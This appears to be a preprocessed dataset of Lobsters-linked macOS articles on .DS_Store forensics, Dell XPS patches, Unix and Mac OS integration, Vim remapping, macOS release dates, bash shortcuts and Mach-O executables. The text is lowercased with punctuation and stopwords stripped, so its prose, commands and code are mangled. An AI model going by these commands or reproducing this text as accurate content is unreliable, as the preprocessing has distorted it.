would simply run gooswindows go build dsdumpexe copy whatever window system run pretty sweet huh shout slavik demisto quickly getting running go spent time looking documentation update using dsstoreparser nicole ibrahim recently presented sans dfir summit dsstore file pointed u parser built http githubcomnicoleibrahimdsstoreparser using simple downloading running download source git clone http githubcomnicoleibrahimdsstoreparsergit change directory cd dsstoreparser install requirement unicodecsv needed install unicodecsv user run pointing source folder containing dsstore file like parse provide output folder result dsstoreparserpy pathtosource outputdir comparing dsstore parsing solution see variety useful tool native thirdparty assist analyzing dsstore file hex viewer invaluable tool many reason namely assisting identifying unknown structure artifact item within given file gstrings offer easy way search appropriate string easily installable pseudonative utility fdb allows option specify baseurl prepend result appropriate path based given dsstore file location dsstore go parser job well compiled portable major o handy mac forensics gokit sort nicole dsstoreparser nice clean pythonbased solution provides variety output report better assist seeingunderstanding information contained within file wrapping regardless whyhow trashdsstore file recreation occurs address part post option choose parseextract item may least additional dfir investigation method artifact identify previously deleted file longer resident allocated disk though focused solely dsstore file post note dsstore file assist identifying deleted file system several filesareas searched investigation however wanted hone analysis file possibly lesser known least research experience rate hope somehow useful investigation moving forward usual ymmv interested hear feedback story ifhow work field everyone jp
459,Lobsters,mac,Apple macOS,XPS9350-macOS – macOS patches for Dell XPS 13 9350,https://github.com/syscl/XPS9350-macOS,macos patch dell xps,macos dell peculiarity guide preliminary installation contribution list change log change log,macos dell project target giving relatively complete functional macos start brief introduction finish powering macos laptop peculiarity since original wifi module compatible macos need buy module please follow guide swap preliminary create vanilla installation disk usb removable disk google install clover uefi installation disk created replace original clover folder one change bios setting following disable secure boot set sata operation ahci boot usb hit andor capture acpi table usb install macos reboot finished step install clover uefi ssd replace original clover folder ssd one usb drive finish installation macos following step finish post installation macos installation download latest version installation packagedirectory entering following command terminal window git clone recursive http download whole installation directory current directory next step change permission file add x run cd chmod x deploysh run script terminal window note dump acpi table pressing clover first execute following command line reboot macos see change problem script try run deploy debug mode contribution suggestion improvement welcome nt hesitate pull request open issue want project better ever writing supporting code fun take time please provide descriptive bugreports pull request list try get rid scripting procedure use dynamic acpi hot patch change log change log detail improvement
460,Lobsters,mac,Apple macOS,The Challenges of Integrating the Unix and Mac OS Environments (2000),https://www.usenix.org/legacy/event/usenix2000/invitedtalks/sanchez_html/,challenge integrating unix mac o environment,usenix invited talk presentation challenge integrating unix mac o environment history topical focus filesystems file multiple user classic environment presenter contact information,usenix invited talk presentation challenge integrating unix mac o environment history topical focus wilfredo sanchez apple computer mac o developed around idea providing best possible user experience apple succeeded making mac o bestofbreed operating system personal computer mac o set standard modern graphical user interface modeled primary alternative mac o time microsoft do ran ibm pc mac o able provide functionality do provided via visual model proven much easier lay user understand commanddriven interface employed do system unix tight integration underlying hardware allowed macintosh platform extend experience beyond software actual management machine plugandplay device support box support many device macintosh led way technology desktop publishing unix evolved different set goal unix popular academic engineering environment often used highend server workstation developer u c berkeley academic institution used unix testbed many research endeavor resulted important computing technology tcpip unix machine typically shared many user requiring support individual user account could utilized simultaneously machine unix early exposure advance lead deep understanding various subsystem interact resulting relatively robust modular system unix system served basis continue support much infrastructure today internet unix derivative sun solaris cal bsd unix later linux grown serve key role network server do eventually replaced window sport user interface feature pioneered mac o desktop well underlying idea behind unix preemptive multitasking unix system remain lead reliability scalability mac o continues push user interface innovation forward window successfully narrowed gap area mac o x apple effort create bestofbothbreeds operating system directly leverage advance experience apple user experience arena wellestablished power bsd mac o x begin bsd foundation called darwin darwin build programming toolkits mac o call carbon turn enables u layer new user interface known aqua carbon also provides straightforward transition strategy existing application base also provide toolkit called cocoa objectoriented api derived next openstep make interesting system architecture ideal result system sort reliable server platform use today host highvolume web site file service network gateway engineering computation service also simple use home computer platform choice daunting task server platform goal mandate certain level complexity high security performance tuning parameter various network server etc home user simplicity override concern unix mac o evolved independently fundamental assumption made one system cause numerous failure capability available filesystems networking protocol usersystem model profoundly varied often way rectified without changing architecture system component additionally people use system different way expect different behavior paper discus issue arisen apple process combining disparate environment solution used make thing work well mac o x many issue interest brevity visit two key area filesystems multiple user support example given go great deal detail enough information provided give reader idea problem attempt solution filesystems use filesystems demonstrates implementation semantic problem unix mac environment start implementation issue obvious material filesystems used mac o mac o extended filesystem also known hf predecessor mac o standard file system hf hierarchical file system filesystems supported mac o x though hf support provided compatibility user encouraged use hf new volume hf volume format unlike hf volume format fortunately provides storage unixstyle metadata eg owner mode bit made lot easier enable use hf darwin environment however incompatibility still exist hf case preserving case insensitive filesystem case file name remembered access file name varying case yield file file name vary case allowed given directory typical unix filesystems contrast case sensitive start rhapsody project preceded current mac o x work anticipated would big problem later started using hf primary filesystem darwin found surprisingly problem resulting behavior find tend trivial fix yet encounter problem area requires complex solution another obvious problem different path separator hf colon ufs slash also mean hf file name may contain slash character colon opposite true ufs file name easy address though involves transforming string back forth hf implementation kernel vfs layer convert colon slash vice versa reading writing ondisk format disk separator colon vfs layer therefore anything kernel libc slash however traditional mac o toolkits expect colon bsd layer core carbon toolkit yet another translation result carbon application see colon everyone else see slash create uservisible schizophrenia rare case file name containing colon character appear carbon application slash character bsd program cocoa application colon hf lack support volume format hard link standard feature ufs initially attempted creation link file would yield supported error discussed solution creating symbolic link instead semantics symbolic link significantly different troubleshooting reason preferable fail link creation time later time due problem related semantic difference problem significant amount software break hard link creation fails software need redesigned hard link used order accommodate software emulate hard link creating kernellevel symbolic link visible interpreted hf filesystem necessary due lack support volume format resulting behavior similar hard link viewed kernel though relatively inefficient comparison ufs hand support file id feature hf file id persistent handle file used access file manner similar one us path unix nice thing file id id file obtained file renamed moved anywhere disk still found opened holder id file access id faster access path avoids path lookup mac o alias similar symbolic link addition alternative mean finding file alias include target file id moving target file break alias would symbolic link one biggest problem lack complex file support unix filesystems hf allows file multiple data stream one data fork contains actual file data another resource fork contains additional resource data filesystem level really two file happen share name volume format also allows arbitrary named file attribute similar support udf though neither mac o mac o x support use feature file format often source compatibility issue mac o platform past transferring file via internet usually need encoded format macbinary combine stream one served web ftp server server run mac o needed several proposal present complex file bsd client open one combine two stream appledouble format advantage containing data complex file program like cp could work properly problem one open complex c source file emacs see program text also weird encoding information whatever resource data put carbon application fatal problem scheme part file data encoding info creates filesystem nt really part file data therefore editable nonlossy aspect solution drew u complication turned substantial present mechanism present data fork bsd client file opened name resource fork desired read appending known string file path example foobar get data file bar foobarnamedforkresource get resource fork bar actual appended string may change note file somehow acting directory listable stat call still show file mechanism carried filesystems complex file udf udf also allows attribute directory flaw plan well unix software see data fork file cp foo bar result new file bar missing resource data foo backup archiving software may also lose data still problem sharing file system nt support complex file mac o x continue support complex file moving away use order increase ability operate heterogeneous environment third option explore show two fork separate file altogether similar appleshare implementation unix export unix filesystem appleshare volume file foo written mac o client viewed unix side another file usually named convention similar fooresource resourcesfoo contains resource data server also serving unix client including local access often case file tend get moved around unix side resource file left old location result effective loss resource data need somehow manage periodically clean disassociate resource file hf filesystem probably address problem magically moving resource file along data strange behavior sort tends produce bug approach nt seem offer significant advantage alternative got dropped interestingly carbon team run exactly problem ufs obvious place store resource fork present implementation carbon us similar solution one employed unix appleshare server filesystem problem subtle due different semantic expectation made mac o unix system well implementation detail one example delete semantics mac o compared unlink semantics unix mac o try delete file someone else open delete fails ensures another application using file file deleted application unix achieves going ahead removing link file continues exist open though longer way open file good argument made either method mac o program rely mac o behavior file sometimes used semaphore many unix program expect unlink always succeed one trick unix world open file writing unlinking obtain private bit filesystembacked memory scribble worth noting difference behavior part due implementation respective filesystems ufs metadata store file inode inodes stored separately file data hf file metadata stored file data inode removal file hf therefore mean removal access file unlink behavior ufs come naturally separation data inodes simply delete file keep inode around long use hand one really fast searching volume file given name hf storage layed interesting implementation detail lead idea extension may part original design order handle differing semantics delete system call added bsd semantics available typically unix program call unlink carbon application call delete unlink always succeed still possible carbon application file open lose file closed bsd program unlinked acceptable goal allow carbon program continue cooperate designed bsd program nt usually delete file belonging carbon program software tends work expected also aware primary goal get mac o x operate properly differing software stack still million classic mac o user user need share file medium new mac o x user one example trouble unix permission hf volume mac o read write unix metadata though hf support mac o ignore bit completely acceptable start moving disk mac o mac o x system dual boot system also lesser degree run classic environment mac o x may problem expect permission enforced across system handing someone disk booting another o bound get dissapointed eventually interesting situation however occurs file get created mac o seen later mac o x file unix metadata set therefore permission owner user root group wheel reasonable default file mode almost certainly user want fortunately able distinguish metadata set zero value mode owner info case present owner group mode reasonable default determined examining permission directory node filesystem mounted note actual permission disk remain unset unless someone set explicitly unmount remount different default effect mode file allows flexible administration default mode disk default open permission others desired mentioned hf also supported primarily allow transfer data removable medium existing hard drive volume formatted hf constraint found similar do filesystem support linux file transfer hf present problem hf store mode bit default used manner use unset mode hf file significant new problem file transferred hf volume lose permission information file kernel file name convention unix manifested limitation bug various unix software ufs allows printable character file name many unix shell script program problem file contain special character whitespace punctuation mac o user subject limitation system subject mac o x one good example make command us whitespace file name delimiter making difficult produce program output called example netscape reason case unfortunate historical artifact unix grew mentioned unix heavy reliance file path one many example bourne shell sh program exist bin system wo nt even boot properly mac o immune problem allow user relocate rename even important item system folder particularly significant issue although use bsd core system software want require user understand bsd work ideally typical macintosh user even know bsd presence folder usr etc disk therefore awkward hide directory content application level order avoid confusion moved deleted one idea put system file mac osstyle system folder make folder opaque user requires method managing system software allowing user poke still problem standard unix path required exist root level boot volume still area actively working improve upon original mac o wonderful feature application kept one file though fork file sometimes used could therefore drag one icon install floppy onto hard disk another floppy done could drag one icon trash get rid program year gotten model several file deal application file kept one folder application also put various file part system folder preference system extension font product like adobe installs many file onto system actual executable program folder plugins filter file translator effect another color palette brush pattern help file sample bsd convention reasonable unix convention file located according function might put program usrbin icon usrsharephotoshop plugins usrlibexec certain advantage problem approach file scattered around disk making somewhat difficult install uninstall software addressable using package installer scheme receipt easily broken user us different installers bypass installer unrolling tar archive one neat idea inherited next notion opaque directory user level behave like file folder call bundle use variety way whenever need encapsulate set file one uservisible object put application data one bundle several subdirectory file program executable go well additional resource plugins finder treat bundle one opaque object draginstalled like good ol day follow similar scheme systemwide library instead putting header usrinclude library usrlib additional resource wherever go create single framework bundle encapsulates everything needed library compiler know find specific file framework type bundle welldefined structure multiple user unix root environment computing machine expensive rare mandated shared important computational resource utilized well possible order amortize cost give everyone involved chance get cycle respective project therefore unix early notion timesharing feature like multitasking single processor user account security became important early note security many aspect one important aspect level protection one process another process mistake time often critical readily apparent one running program ability usually accidentally impede destroy progress another unacceptable lead need preemption separate protected address space process security mechanism file permission degree extend naturally basic interprocess security process run behalf given user restricted user permission access file certain system call private memory allocated process ensures one running program hijack another memory affect execution macintosh introduced first truly personal computer different need machine designed one person could buy use hence term personal need time sharing would one console user would need run one program time hardware much modest original mac o could barely squeeze available ram later became clear running program sidebyside could useful nt really true personal computer gained enough power memory feasible aside computational power also needed thing largerscreen display easy hindsight given spiffy computer today look mac o today think original decision still carry system well considered would grossly unfair assessment situation today find greater computational resource embedded system first macintosh mac o designed devote limited resource personal computer one user mac o notion file permission since introduction file sharing model extend local volume mac o added support multiple user logins user preference remembered logins independent rest file security however support rather superficial compared unix still single shared address space program devicelevel access hardware even sufficient us particularly light fact one user use machine time unix user concept understood even kernel mac o software never deal pervasive user model mac o x challenge introduce feature without breaking existing software product user rely also important note user accustomed great deal control system without many barrier bsd even something seemingly trivial setting time day requires superuser access file disk ca nt move around folder ca nt even open look appears require great deal user education desirable system supposed intuitive use however intentional want move away model casual user fiddle around system software daytoday basis necessary mac o many software package install ask user install software system extension system folder mac o x discourages sort manipulation system software instead try provide le destabilizing method developer extend system software general issue trading user convenience v system security complex one lot probably left user decide depending machine used factor network connectivity however lot tradeoff avoided writing smarter software let system security model fit naturally user interacts system important present security feature annoyance annoyed user likely disable security altogether perhaps despite risk issue systemwide need revisited periodically move forward another problem run unix problem specific mac o x one unix system yet felt compelled address unix filesystems store owner group information disk writing user group system id typically natural number file metadata given workstation nametoid mapping always consistent though always onetoone one take disk one computer attach another hard problem arise usergroup id disk two machine netinfo network user group id disk parent netinfo server good shape since consistent across host however machine different netinfo domain often probably local domain likely scenario id may useful meaning second machine even difficult id may consistent eg system user id others reliable way know id correct many permutation problem may affect file permission id one host may map different user user person may account machine user name andor id may different solution truly nontrivial keep track volume local running system new volume introduced ask user decide action take accept id face value unix default add volume list locally known volume ignore id volume new user group pair called unknown returned filesystem file written volume get written user group unknown chown chgrp call ignored ignore setuid bit similar behavior do filesystems hf hf volume nt storage user group anyway write user group unknown file disk unset setuid bit mount volume normally add list locally known volume similar option except new file owner local user id chmod chgrp setting stick classic environment problem described solvable mac o x change carbon bsd implementation accommodate one reason need carbon first place existing mac o toolbox live well new core o brings much harder problem thousand software title already use million customer written built old toolbox classic environment mac o x creates virtual machine inside mac o x boot largely unmodified version mac o application built mac o carbonized run environment classic environment replaces hardware abstraction layer mac o series shim pas request part mac o x example memory request mac o get fulfilled memory request darwin kernel mac o thereby use resource managed mac o x resource sharing varying limitation example mac o want mount disk classic accomplish creating shim scsi level handled io kit darwin kernel arrow figure classic making raw scsi request disk mounted bsd native side serious problem disk shared native classic application fact way disk initially accessed classic another option store disk image file mac o x filesystem provides mac o disk storage without taking drive away native environment arrow b figure one advantage mac o know hf hf filesystems disk image could live filesystem provided bsd darwin third implementation shimmed mac o disk driver darwin arrow c figure removing direct scsi access enabling use single partition disk rather taking whole device lastly filesystem call mac o could passed mac o x hf filesystem enabling sharing file hf filesystems native classic application preferred mode arrow figure could take thing step classic call carbon library point still making system call kernel emulate hf semantics several filesystems might possible mac o classic using file ufs nfs volume remaining ignorant filesystems tradeoff made move along application access file via standard api example norton disk doctor want talk disk driver move arrow mac o disk driver service disk doctor work similarly apple drive setup application go straight scsi level absent b c case ironically macintosh historically closed architecture played key role making possible detail hardware public direct hardware access closely guarded mac o application writer never found convenient write around standard apis use layering system work vast majority application strategy worked device usb device shimmed usb driver level give mac o exclusive access hid layer allows sharing native application arrow b figure screen usage done via core graphic quartz work rather nicely mac o claim window region managed mac o x window server presenter wilfredo sánchez graduate massachusetts institute technology cofounded internet publishing company agora technology group cambridge massachusetts worked enabling electronic commerce dynamic application via world wide web disney online north hollywood california fred presently senior software engineer apple computer cupertino california work primarily bsd subsystem mac o x member core operating system group engineering lead apple open source project fred also member apache software foundation netbsd freebsd developer contributor various project patrick w dirk mac o x filesystems technical lead apple brent knight classic team contributed significantly paper error however fred updated version paper available online http contact information wilfredo sánchez senior software engineer scientist apple computer inc infinite loop cupertino ca fax copyright wilfredo sánchez id indexhtml v tritan exp
461,Lobsters,mac,Apple macOS,Preparing Vim for Apple’s Touch Bar,http://csswizardry.com/2017/01/preparing-vim-for-apples-touch-bar/,preparing vim apple touch bar,preparing vim apple touch bar background remap key using capslock update alternative difference expert mode touch bar background modal editor key located today remap key long time home row online documentation using capslock update view full sizequality alternative difference expert mode stack overflow answer help buy coffee,january preparing vim apple touch bar written harry robert cs wizardry table content background remap key using capslock update alternative esc difference expert mode apple recently announced updated macbook line introducing touch bar would replacing physical function row including escape key like vim user might quite impact best prepare background vim modal editor unlike text ready type soon load normal mode make conscious choice enter insert mode order begin typing finished typing need get back normal mode one common option hit escape esc reason esc used bill joy author vim predecessor vi used terminal whose esc key located today tab convenient topleft location today actually many mode besides insert normal switching back normal mode usually requires hitting esc well see vim user escape key important u switch mode without escape key remap key almost long using long time using jj jk leave insert mode mapping home row always easy reach letter pair rarely ever occur english language word contained jj jk next would flung straight normal mode time tried write reason mapped kk escape occur within word eg bookkeeper although think might first time ever actually written word bookkeeper interestingly bookkeeper english word three consecutive double letter mean time typing hitting either jk jj get back normal mode leaf finger primed moving always use instead esc get insert normal adding line vimrc make jj jk throw normal mode inoremap jj esc inoremap jk esc creates insert mode nonrecursive map jj jk esc information mapping either run help maptxt see online documentation really help u normal mode though visual mode going move selection command mode literally write character else using capslock lot people also like map capslock esc however need done o level number different thirdparty tool personally like idea systemwide keyboard change sake text editor update running macos sierra natively map capslock esc remap capslock escape system preference view full sizequality alternative esc whereas jj jk remapped act like esc turn native alternative esc use across mode mentioned hitting jj jk command mode interpreted literally visual mode navigate mode use either ctrl c vimspeak ctrlc cc vimspeak vim help even say note esc key hard hit keyboard train use ctrl whenever mode insert reach c cc instead esc cc probably going little easier remember probably recognise cancel signal shell however subtle difference difference c act almost universally identically esc nothing real note need little mention cc cc cancel signal job get straight whatever back insert mode fast possible mean cc complete pending abbreviation send insertleave signal back vim plugins may depend mean cc bad avoided heavy handed two mileage may vary expert mode got alternative esc key gradually begin phasing workflow make thing little difficult could disable esc key fully let take training wheel map esc operation nop remapineverymode command need drop vimrc cover possibility map escape nothing normal visual select operatorpending mode noremap esc nop map escape nothing insert command mode noremap esc nop want exercise caution unexpected sideeffects outlined stack overflow answer help buy coffee
462,Lobsters,mac,Apple macOS,A useless analysis of OS X release dates,http://robservatory.com/a-useless-analysis-of-os-x-release-dates/,useless analysis o x release date,,updated republished macos supplemental update skip unless really really care macos release originally published november break table showing major release macos previously mac o x public beta latest public version macos august release total note click symbol read apple release note given update following culled apple support downloads page date may bit know certain something incorrect please let know get fixed scroll see entry year date day version size comment aug gb jul gb jun gb may gb apr gb mar gb jan gb dec gb oct gb oct mb info page oct gb catalina need permission sep gb aug gb aug mb jul gb may gb mar gb jan gb dec gb nov gb macbook air oct gb sep gb mojave need permission release aug gb touch bar jul gb touch bar mbp jul gb airplay jun gb message icloud mar gb sortable safari bookmark feb su mb indian charactermessages crash fix jan gb jan su mb spectre meltdown fix dec gb oct gb oct su mb address two security issue sep gb high sierra higher mountain jul gb may gb mar gb night shift jan gb dec gb oct gb sep gb sierra still mountain jul mb may mb mar gb jan mb dec gb oct gb sep gb el capitan go climb something aug gb jun gb apr su mb supplemental update apr gb includes photo app jan mb nov mb oct gb yosemite surfer sep mb jun mb may mb feb mb dec mb oct gb maverick big cat oct su mb supplemental update sep mb jun mb mar mb oct su mb supplemental update sep mb aug mb jul gb mountain lion app store oct su mb supplemental update sep gb released w may mb feb gb combo updater available oct mb icloud enabled aug mb jul gb lion app store usb stick later jun mb app store readied lion mar mb jan mb say app store nov mb jun mb mar mb nov mb sep mb aug gb snow leopard first intelonly release aug mb may mb dec mb sep mb jun mb may mb feb mb combo updater nov mb oct gb leopard first universal binary release nov mb go jun mb mar mb sep mb jun mb apr mb feb mb jan mb first intelcapable release oct mb jul mb may mb apr gb tiger apr mb feb mb dec mb combo updater nov mb aug may mb combo updater mar mb combo updater dec mb nov mb oct gb panther oct mb aug firstgen may mb apr mb feb mb dec mb nov mb sep mb update available aug gb jaguar jun mb combo updater apr mb feb mb dec mb nov mb sep mb puma jun mb may mb may mb released replaced see comment apr mb mar mb cheetah sep mb public beta note day column reflects number day release entry may appear chronological order ie shown oct nov keep version number proper order even older o received update major new release came happened time year random note updated original post starting public beta macos macos release major minor figure includes every macos release two far tell never released believe update oneday somewhat odd publicly discussed counted wrong either please correct july macos release date day since public beta released average seen sort update every day shortest time period two release counting oneday releaseandreplace six day quickly supplemental update came release longest time period two minor release day long waited update smallest update largest noncombo nonmain o release update entry size given release indicates unable find size feel free contact help replace entry gratuitous release version number release year special thank go mr ziebell providing size value veryold minor update benton quest providing size info major release snow leopard see benton comment want nicely detailed history early release
463,Lobsters,mac,Apple macOS,"Compile c++, objc and swift program across platforms fastly",http://tboox.org/2017/01/18/usage-demo/,compile c objc swift program across platform fastly,,
464,Lobsters,mac,Apple macOS,Mastering Bash and Terminal,https://www.blockloop.io/mastering-bash-and-terminal,mastering bash terminal,assumed setting repeat command movement copy paste changing directory background process working file choose start,one tool every developer us regardless language platform framework terminal compiling code executing git command scping ssl certificate remote server finding new version cowsay entertain wait one former much use terminal important efficient way make time terminal efficient effective assumed setting command list alt prefix character manually set alt meta key without setting enabled use esc key instead recommend enabling alt key mac terminalapp setting preference profile tab keyboard subtab bottom option meta setting preference profile tab key subtab bottom window set option key act gnome terminal edit keyboard shortcut uncheck menu access also assume using bash know cool newcomer like zsh fish trying others always found utility missing illreplaced using bash ymmv also assume using least bash version mac unless manually installed bash homebrew using old version install bash homebrew include etcshells repeat command spend lot time terminal repeating command previously run one thing noticed lot people use arrow navigate history command terribly inefficient requires repositioning hand often time removing eye computer screen also history depending histsize long using arrow almost like searching terrible version oxford english dictionary one word per page instead searching linebyline use search history ctrlr ctrls terminal window type text press ctrlr see prompt change reverseisearch begin typing part previous command executed see recent command match search one want press ctrlr search incrementally example searching kubectl delete pod lappnginx would type kubectl kubectl del land command incrementally searching backward pas one looking press ctrls go direction see prompt change isearch find command want press enter execute move cursor leftright modify command first note ctrls probably work default terminal need add stty ixon bashrc bashprofile mac sometimes know command want repeat two three place back history case sometimes easier move command directly still use arrow key bash keyboard shortcut use ctrlp ctrln pressing ctrlp move previous command history replacing arrow ctrln move next command replacing arrow mose case history probably set record duplicate get pretty annoying use following setting make sure history get flooded duplicate entry add bashrc bashprofile history keep newest version command typed git status seven time record latest one delete previous entry export histcontrolignoreboth erasedups movement know need arrow key left right unfortunately key still needed single character movement find using le often key combination move cursor little efficiently ctrla move cursor beginning current line ctrle move cursor end current line altb move cursor backwards one word altf move cursor forward one word ctrlk delete cursor end line ctrlu delete cursor beginning line altd delete word front cursor ctrlw delete word behind cursor last four necessarily movement use conjunction time copy paste one favorite macos command line utility pbcopypbpaste like much created alias linux machine using xclip shared two command use system clipboard also called pasteboard hence name pipe data pbcopy copy something system clipboard pipe pbpaste another command paste clipboard example use copy public ssh key system clipboard pasting github pbcopy sshidrsapub paste something copied internet file pbpaste maingo append something copied internet end file pbpaste maingo copy public ip address clipboard curl s icanhazipcom pbcopy copy private ip address clipboard probably good idea alias ip addr show grep inet awk print awk f print pbcopy replace clipboard encoded version pbpaste pbcopy linux put following bashrc create effect alias pbcopyxclip selection clipboard alias pbpastexclip selection clipboard changing directory cd one used command according bash history one thing find lot changing two directory briefly changing directory directory b back depending reason changing directory use either cd combination pushd popd type cd press enter change previous working directory cd go cd tmp cd put back go cd put back tmp hand sometimes know want go directory different place might cd time get want mark place get back quicker case would use pushd like cd go pushd tmp mark current directory cd tmp cd ssl cd certificate cd would take back tmpssl previous working directory popd take back go pushd multiple time build stack find much need background process one pet peves working software developer almost always ten terminal window open time usually one terminal per directory working avoided using pushd popd cd trick mentioned often window open running process locked window difficult work requires flipping back forth knowing everything executing process like use mixture command need run command indefinitely send background first running pressing ctrlz suspend pause process suspended type bg press enter move running state longer control terminal window however close terminal job terminate avoid disown process typing disown pressing enter point process longer child current terminal process often use run kubectl proxy python simplehttpserver ctrlz move current process background suspended state job l list current background process current tty session bg tell recent background process continue running background fg bring recent background process back foreground disown h disown recent background job remove current tty session able brought back foreground control either kill something else bg fg disown used job number found job l run job l see job number beginning line want bring job foreground run fg want disown fourth job run disown h plus sign minus sign bigging line meaning well plus sign indicates job recently used one targeted type command without job id minus sign second recently used use ctrlz lot use single terminal window vim command line interface writing code vim need get back shell prompt use ctrlz suspend vim note still print stdout stderr command window want change redirect file modified show current background job count function jobscount cnt job l wc l cnt gt echo ne e cnt e fi add jobscount end like export e u e e h e e w e gitbranch jobscount n working file several time throughout day want view content file would cat file open vim cat annoying flooded terminal history learned use le open file pagination open file le content file become paginated start page one great le many favorite key combination work use ctrlu page ctrld page ctrlp scroll one line ctrln scroll one line g go top file g go bottom file search file le great opening file may know file first place say file named remember exactly put could cd back forth find people run start browse ui window terrible workflow instead use either find ag silver searcher tree find great searching file name run find type f name authpy search current directory file named tree great listing directory tree format much like see ui ag applciation called silver essentially modernized version grep find using quite often better grep automatically ignores commonly ignored file git directory virtualenv anything listed gitignore like silver searcher command line argument similar grep flag generally transferrable note best combine command le likely flood terminal history choose start use first started using bash memorize picked one two year difficult memorize key combination especially many pick one two shortcut focus using find using command muscle memory memorizing keyboard shortcut fact started write open terminal work around remember shortcut use hope help work bash terminal effectively easy learn one new trick force use day get used comfortable command pick another one
465,Lobsters,mac,Apple macOS,Mach-O Executables (2013),https://www.objc.io/issues/6-build-tools/mach-o-executables/,macho executables,xcrun hello world without ide hello world compiler compiler preprocessing parsing semantic analysis code generation optimization assembler linker preprocessing product perform action preprocess compilation o x assembler reference application binary interface gentle introduction assembly product perform action assemble assembler linker section causing havoc o x assembler reference section content side note performance code size performance guideline arbitrary section macho macho macho file format complex sample compiling multiple file symbol linking dynamic link editor dyld shared cache,build application xcode part happens source file h get turned executable executable contains byte code run cpu arm processor io device intel processor mac walk compiler inside executable first meet eye let put xcode aside step land commandline tool build xcode simply call series tool florian discus work detail call tool directly take look hopefully give better understanding executable io o x socalled macho executable work put together xcrun infrastructure first commandline tool called xcrun use lot may seem odd pretty awesome little tool used run tool instead running clang v terminal use xcrun clang v xcrun locate clang run argument follow clang would may seem pointless xcrun allows u multiple version xcode use tool specific xcode version use tool specific sdk software development kit happen xcode xcode xcodeselect xcrun choose use tool header file etc io sdk xcode o x tool xcode platform close impossible check man page xcrun xcodeselect detail use developer tool command line without installing command line tool hello world without ide back terminal let create folder c file mkdir desktopobjciocommandline cd touch helloworldc edit file favorite text editor even texteditapp open e helloworldc fill piece code include stdioh int main int argc char argv printf hello world n return save return terminal run xcrun clang helloworldc aout see lovely hello world message terminal compiled c program ran without ide take deep breath rejoice compiled helloworldc macho binary called aout default name compiler use unless specify something else binary get generated multiple piece look understand look compiler first hello world compiler compiler choice nowadays clang pronounced klæŋ chris writes detail compiler briefly put compiler process helloworldc input file produce executable aout processing consist multiple stepsstages run succession preprocessing tokenization macro expansion include expansion parsing semantic analysis translates preprocessor token parse tree applies semantic analysis parse tree output abstract syntax tree ast code generation optimization translates ast lowlevel intermediate code llvm ir responsible optimizing generated code targetspecific code generation output assembly assembler translates assembly code target object file linker merges multiple object file executable dynamic library let see step look simple example preprocessing first thing compiler preprocess file tell clang show u look like stop step xcrun clang e helloworldc wow output line let open editor see going xcrun clang e helloworldc open f top see lot lot line starting pronounced hash socalled linemarker statement tell u file following line need look helloworldc file see first line include stdioh used include import tell preprocessor insert content file stdioh include statement recursive process stdioh header file turn includes file since lot recursive insertion going need able keep track line resulting source originate preprocessor insert linemarker beginning whenever origin change number following line number followed name file number end line flag indicating start new file returning file following system header file treated wrapped extern c block scroll end output find helloworldc code helloworldc int main int argc char argv printf hello world n return xcode look preprocessor output file selecting product perform action preprocess note take second editor load preprocessed file likely close line long compilation next parsing code generation tell clang output resulting assembly code like xcrun clang helloworldc open f let take look output first notice line start dot assembler directive one actual assembly finally label similar label c let start first three line section text text regular pureinstructions globl main align three line assembler directive assembly code section directive specifies section following go section bit next globl directive specifies main external symbol main function need visible outside binary system need call run executable align directive specifies alignment follows case following code byte aligned padded needed next preamble main function main main cfistartproc bb pushq rbp cfidefcfaoffset cfioffset rbp movq rsp rbp cfidefcfaregister rbp subq rsp part bunch label work way c label symbolic reference certain part assembly code first actual start function main also symbol exported binary hence reference position cfistartproc directive used beginning function cfi short call frame information frame corresponds loosely function use debugger step step actually stepping inout call frame c code function call frame thing cfistartproc directive give function entry ehframe contains unwind information exception unwind call frame stack directive also emit architecturedependent instruction cfi matched corresponding cfiendproc output mark end main function next another label bb finally first assembly code pushq rbp thing get interesting o x code architecture socalled application binary interface abi specifies function call work assembly code level part abi specifies rbp register base pointer register must preserved across function call main function responsibility make sure rbp register value function return pushq rbp push value onto stack pop later next two cfi directive cfidefcfaoffset cfioffset rbp output information related generating call frame unwinding information debug information changing stack base pointer two basically tell debugger thing rather cause information output debugger later use find way movq rsp rbp allow u put local variable onto stack subq rsp move stack pointer byte function use first storing old stack pointer rbp using base local variable updating stack pointer past part use next call printf leaq lstr rip rax movl rbp movl edi rbp movq rsi rbp movq rax rdi movb al callq printf first leaq load pointer lstr rax register note lstr label defined assembly code c string hello world n edi rsi register hold first second function argument since call another function first need store current value use byte based rbp reserved first value edi register hold argc value rsi register hold argv using value later since compiler running without optimization store anyway put first function argument printf rax first function argument register edi printf function variadic function abicalling convention specifies number vector register used hold argument need stored al register case finally callq call printf function movl ecx movl eax rbp spill movl ecx eax set ecx register save spill eax register onto stack copy value ecx eax abi specifies eax hold return value function main function return addq rsp popq rbp ret cfiendproc since done restore stack pointer shifting stack pointer rsp back byte undo effect subq rsp finally pop value rbp stored earlier return caller ret read return address stack cfiendproc balance cfistartproc directive next output string literal hello world n section text cstring cstringliterals lstr str asciz hello world n section directive specifies section following need go lstr label allows actual code get pointer string literal asciz directive tell assembler output string literal start new section text cstring section contains c string lstr str asciz hello world n two line create nullterminated string note lstr name used access string final subsectionsviasymbols directive used static link editor information assembler directive found apple o x assembler reference amd website documentation application binary interface also gentle introduction assembly xcode let review assembly output file selecting product perform action assemble assembler assembler simply put convert humanreadable assembly code machine code creates target object file often simply called object file file file ending build app xcode find object file inside objectsnormal folder inside derived data directory project linker talk bit linker later simply put linker resolve symbol object file library mean recall callq printf statement printf function libc library somehow final executable need able know memory printf ie address printf symbol linker take object file case one library case implicitly libc resolve unknown symbol case printf encodes final executable symbol found libc linker output final executable run aout section mentioned something called section executable multiple section ie part different part executable go section section turn go inside segment true trivial app also binary fullblown app let take look section aout binary use size tool xcrun size x l aout segment pagezero vmaddr fileoff segment text vmaddr fileoff section text addr offset section stub addr offset section stubhelper addr offset section cstring addr offset section unwindinfo addr offset section ehframe addr offset total segment data vmaddr fileoff section nlsymbolptr addr offset section lasymbolptr addr offset total segment linkedit vmaddr fileoff total aout file four segment section run executable vm virtual memory system map segment address space ie memory process mapping different nature unfamiliar vm system simply assume vm load entire executable memory even though really happening vm pull trick avoid vm system mapping segment section mapped different property namely different permission text segment contains code run mapped readonly executable process allowed execute code modify code alter mapped page therefore never become dirty data segment mapped readwrite nonexecutable contains value need updated first segment pagezero large actually file file specifies first process address space mapped nonexecutable nonwritable nonreadable get excbadaccess reading writing null pointer value relatively small operating system trying prevent causing havoc within segment section contain distinct part executable text segment text section contains compiled machine code stub stubhelper used dynamic linker 